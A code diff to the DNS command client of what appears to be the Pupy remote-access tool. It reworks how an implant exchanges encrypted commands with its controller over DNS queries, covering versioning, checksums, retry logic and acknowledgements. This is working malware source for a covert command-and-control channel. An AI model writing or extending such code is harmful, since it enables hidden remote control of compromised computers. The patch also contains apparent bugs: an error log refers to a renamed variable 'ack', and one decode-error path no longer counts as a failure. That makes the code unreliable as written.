@@ -31,6 +31,8 @@ from Crypto.Random import get_random_bytes
 from ecpv import ECPV
 from picocmd import *
 
+CLIENT_VERSION = 2
+
 try:
     from network.lib import tinyhttp
 except ImportError:
@@ -193,16 +195,18 @@ class DnsCommandsClient(Thread):
         if len(data) > 35:
             raise ValueError('Too big page size')
 
-        version = 2
-
         nonce = self.nonce
-        node_block = struct.pack('>BQ', version, self.cid) + to_bytes(self.node, 6)
+        node_block = ''
+
+        if CLIENT_VERSION > 1:
+            node_block = struct.pack('>BQ', CLIENT_VERSION, self.cid) + to_bytes(self.node, 6)
 
         payload = self.encoder.encode(data + node_block, nonce, symmetric=True)
         payload_len = len(payload)
 
-        len_node_block = payload_len - len(data)
-        payload, node_block = payload[:len_node_block], payload[len_node_block:]
+        if node_block:
+            len_node_block = payload_len - len(data)
+            payload, node_block = payload[:len_node_block], payload[len_node_block:]
 
         encoded = '.'.join([
             ''.join([
@@ -223,8 +227,16 @@ class DnsCommandsClient(Thread):
 
     def _request_unsafe(self, commands):
         parcel = Parcel(*commands)
+
+        gen_csum = None
+        check_csum = None
+
+        if CLIENT_VERSION == 2:
+            gen_csum = self.encoder.gen_csum
+            check_csum = self.encoder.check_csum
+
         page, nonce = self._q_page_encoder(
-            parcel.pack(self.nonce, self.encoder.gen_csum))
+            parcel.pack(self.nonce, gen_csum))
 
         try:
             addresses = self.resolve(page)
@@ -238,53 +250,36 @@ class DnsCommandsClient(Thread):
             return []
 
         response = None
+        failed = False
 
-        try:
-            response = Parcel.unpack(
-                self._a_page_decoder(addresses, nonce),
-                nonce,
-                self.encoder.check_csum
-            )
-
-            self.failed = 0
-        except ParcelInvalidCrc:
-            logging.error('CRC FAILED / Fallback to Public-key decoding')
-
+        for attempt in xrange(2):
             try:
+                payload = self._a_page_decoder(addresses, nonce)
+                response = Parcel.unpack(payload, nonce, check_csum)
+                failed = False
+                break
+
+            except ParcelInvalidCrc:
+                logging.error('CRC FAILED / Attempt {}'.format(attempt))
+
                 self.spi = None
                 self.encoder.kex_reset()
                 self.on_session_lost()
-
-                response = Parcel.unpack(
-                    self._a_page_decoder(addresses, nonce, False),
-                    nonce,
-                    self.encoder.check_csum
-                )
-
-            except ParcelInvalidCrc:
-                logging.error(
-                    'CRC FAILED / Fallback failed also / CRC / {}/{}'.format(
-                        self.failed, 5
-                    )
-                )
-                self.failed += 1
-                if self.failed > 5:
-                    self.next()
-
-                return []
+                failed = True
 
             except ParcelInvalidPayload:
                 logging.error(
-                    'CRC FAILED / Fallback failed also / Invalid payload / {}/{}'.format(
-                        self.failed, 5
-                    )
-                )
-                self.failed += 1
-                if self.failed > 5:
-                    self.next()
-                return []
+                    'CRC FAILED / Invalid payload / {}/{}'.format(self.failed, 5))
 
-        return response.commands
+        if failed:
+            self.failed += 1
+
+            if self.failed > 5:
+                self.next()
+
+            return []
+
+        return list(response.commands)
 
     def on_pastelink(self, url, action, encoder):
         if not tinyhttp:
@@ -371,16 +366,26 @@ class DnsCommandsClient(Thread):
             self.proxy = '{}://{}{}:{}'.format(scheme, auth, ip, port)
 
     def process(self):
-        if self.spi:
-            commands = list(self._request(
-                PupyState(self.pupy.connected, self.pupy.manager.dirty),
-                SystemStatus()))
+        commands = []
 
-            ack = self._request(Ack(len(commands)))
-            if not ( len(ack) == 1 and isinstance(ack[0], Ack)):
-                logging.error('ACK <-> ACK failed: received: {}'.format(ack))
+        if self.spi:
+            commands = self._request(
+                PupyState(self.pupy.connected, self.pupy.manager.dirty),
+                SystemStatus())
         else:
-            commands = list(self._request(Poll()))
+            commands = self._request(Poll())
+
+        need_ack = len([
+            x for x in commands if not type(x) in (
+                Policy, Poll, Kex, Ack
+            )
+        ])
+
+        if need_ack:
+            logging.debug('NEED TO ACK: {}'.format(need_ack))
+            ack_response = self._request(Ack(need_ack))
+            if not ( len(ack_response) == 1 and isinstance(ack_response[0], Ack)):
+                logging.error('ACK <-> ACK failed: received: {}'.format(ack))
 
         for command in commands:
             logging.debug('command: {}'.format(command))
